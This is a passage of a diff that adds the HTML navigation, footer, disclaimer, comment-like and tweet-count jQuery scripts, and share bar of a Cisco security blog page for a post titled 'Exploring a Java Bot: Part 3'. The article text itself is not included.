+  <li><a href="https://gblogs.cisco.com/no">Norway</a></li>
+  <li><a href="https://gblogs.cisco.com/pl">Poland</a></li>
+  <li><a href="https://gblogs.cisco.com/pt">Portugal</a></li>
+  <li><a href="https://gblogs.cisco.com/ro">Romania</a></li>
+  </div>
+
+  <div class = "col_4">
+  <li><a href="https://gblogs.cisco.com/ru">Russia</a></li>
+  <li><a href="https://gblogs.cisco.com/es">Spain</a></li>
+  <li><span class = "sub_main">Switzerland</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-tech/">English</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-fr/">French</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-de/">German</a></li>
+  <li><a href="https://gblogs.cisco.com/tr/">Turkey</a></li>
+  <li><a href="https://gblogs.cisco.com/uki/">UK &amp; Ireland</a></li>
+</div>
+<div class = "clear"></div>
+</ul>
+</li>
+      </ul>
+</nav>
+</div>
+<footer class = "sb-slide">
+	<section id = "footer_content">
+				<ul id = "footer_social">
+			<li class = "footer_social_title">Connect</li>
+
+			<li><a target='_blank' href='https://www.facebook.com/ciscosecurity?ref=nf'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_fb.png" height = "25" width = "25"></a></li>
+			<li><a target='_blank' href='https://twitter.com/ciscosecurity'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_tw.png"></a></li>
+			<li><a target='_blank' href='http://www.linkedin.com/company/cisco'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_li.png"></a></li>
+			<li><a target='_blank' href='https://plus.google.com/106092229730683979920'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_gp.png"></a></li>
+			<div class = "clear"></div>
+
+		</ul>
+
+
+		<section id="footer_new">
+			<ul>
+				<li><a href="https://www.cisco.com/web/siteassets/contacts/index.html">Contacts</a>  |  </li>
+				<li><a href="https://secure.opinionlab.com/ccc01/o.asp?id=jBjOhqOJ">Feedback</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/help/index.html">Help</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/sitemap/index.html">Site Map</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/terms_condition.html">Terms &amp; Conditions</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/privacy.html">Privacy Statement</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/privacy.html#cookies">Cookie Policy</a>  |  </li>
+    	 		<li><a href="https://www.cisco.com/web/siteassets/legal/trademark.html">Trademarks</a> <br /> </li>
+    	 	</ul>
+		</section>
+		<br class="clear" />
+    	<section id ="disclaimer">
+    		<b>Legal Disclaimer</b>
+			<p>Some of the individuals posting to this site, including the moderators, work for Cisco Systems. Opinions expressed here and in any corresponding comments are the personal opinions of the original authors, not of Cisco. The content is provided for informational purposes only and is not meant to be an endorsement or representation by Cisco or any other party. This site is available to the public. No information you consider confidential should be posted to this site. By posting you agree to be solely responsible for the content of all information you contribute, link to, or otherwise upload to the Website and release Cisco from any liability related to your use of the Website. You also grant to Cisco a worldwide, perpetual, irrevocable, royalty-free and fully-paid, transferable (including rights to sublicense) right to exercise all copyright, publicity, and moral rights with respect to any original content you provide. The comments are moderated. Comments will appear as soon as they are approved by the moderator.</p>
+    	</section>
+	</section>
+	<script>
+var ajaxurl = "https://blogs.cisco.com/wp-admin/admin-ajax.php";
+jQuery(document).ready(function($) {
+
+	$('a.commentLikeButton').click(function(event){
+		var elemId = event.target.id;
+		var commentId = elemId.replace('clickLike','');
+
+		event.preventDefault();
+
+		var nitroID= $(this).attr("data-nitro");
+
+
+
+		var str = $(this).text();
+		if (str =='1 like') {
+			var total = str.replace('like','');
+		}
+		else {
+			var total = str.replace('likes','');
+		}
+		if ($(this).hasClass( "commentlike")) {
+			var theTotal = parseInt(total);
+   			theTotal1 = Number(theTotal) + 1;
+   			if (theTotal1 === 1){
+   				$(this).text(theTotal1+" like"); 
+   			}
+   			else {
+    			$(this).text(theTotal1+" likes");
+    		}
+    		var data = {
+        		'action': 'addLike',
+				'commentID': commentId,
+				'total': theTotal1
+			};
+
+
+			$.post(ajaxurl, data, function(response) {
+				if (typeof nitroID !== 'undefined') {
+					commentLike(nitroID);
+				}
+				commentLiked();
+			});
+
+    	}
+    	else{
+    		$(this).removeAttr("href");
+    		alert('You already liked this');
+    		/*var theTotal = parseInt(total);
+   			theTotal = Number(theTotal) - 1;
+   			if (theTotal == 1){
+   				$(this).text(theTotal+" like");
+   			}
+   			else {
+    			$(this).text(theTotal+" likes");
+    		}
+    		var data = {
+        		'action': 'removeLike',
+				'commentID': commentId,
+				'total': theTotal
+			};
+			$.post(ajaxurl, data, function(response) {
+				alert('disliked');
+			});*/
+    	}
+
+    	$(this).addClass('commentliked').removeClass('commentlike');
+	});
+});
+
+
+
+
+
+	</script>
+	
+	<script>
+		var ajaxurl = "https://blogs.cisco.com/wp-admin/admin-ajax.php";
+		
+		jQuery(document).ready(function($) {
+			var postID = 12912;
+			var orig_count = 0;
+			$(".twitter a").click(function() {
+
+				var theTotal = orig_count;
+   				var count = Number(theTotal) + 1;
+				var data = {
+        			'action': 'addtweet',
+					'postID': postID,
+					'total': count
+				};
+				$.post(ajaxurl, data, function(response){});
+			})
+		});
+	</script>
+
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/comment-reply.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/wp-embed.min.js?ver=4.9.2'></script>
+</footer>
+<script>//nitro.refreshNML();</script>
+
+
+
+
+</body>
+</html>
+
+  <div id="share_bar1">
+
+    <span class = "share_title">Share</span>
+    <div class="twitter sharrre">
+      <div class = "box">
+        <div class = "count twitcount"></div>
+        <a class = "twitclick" href="https://twitter.com/intent/tweet?url=http://bit.ly/1csxEsz&text=Exploring a Java Bot: Part 3&via=ciscosecurity" data-config-metrics-group='social_shares' data-config-metrics-title='twitter_shares' data-config-metrics-item='twitter_share'>tweet</a>
+      </div>
+    </div>
+
+    <div class="facebook sharrre">
+      <div class = "box">
+        <div class = "count fbcount"></div>
+        <a class = "fbclick share" href = "http://www.facebook.com/sharer/sharer.php?u=https://blogs.cisco.com/security/exploring-a-java-bot-part-3&title=Exploring a Java Bot: Part 3" data-config-metrics-group='social_shares' data-config-metrics-title='facebook_shares' data-config-metrics-item='facebook_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+
+
+    <div class="linkedin sharrre">
+      <div class = "box">
+        <div class = "count licount"></div>
+        <a class = "liclick share" href = "https://www.linkedin.com/cws/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-3" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='linkedin_shares' data-config-metrics-item='linkedin_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+
+
+      </div>
+    </div>
+
+    <div class="googleplus sharrre">
+      <div class = "box">
+        <div class = "count gpcount"></div>
+        <a class = "gpclick share" href="https://plus.google.com/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-3" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='google_shares' data-config-metrics-item='google_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+        <div class = "share_mail"><a class="email emclick" href="mailto:?subject=Cisco Blog: Exploring a Java Bot: Part 3&body=I saw this post on Cisco Security blog and thought you might like to read it.%0A%0AExploring a Java Bot: Part 3%0A%0Ahttps://blogs.cisco.com/security/exploring-a-java-bot-part-3%0A%0A****Disclaimer****%0A%0ACisco is not responsible for the content of this email, and its contents do not necessarily reflect Cisco’s views or opinions. Cisco has not verified the email address or name of the sender." data-config-metrics-group='social_shares' data-config-metrics-title='email_shares' data-config-metrics-item='email_share'></a></div>
+    <div class = "clear"></div>
+  </div>
+  
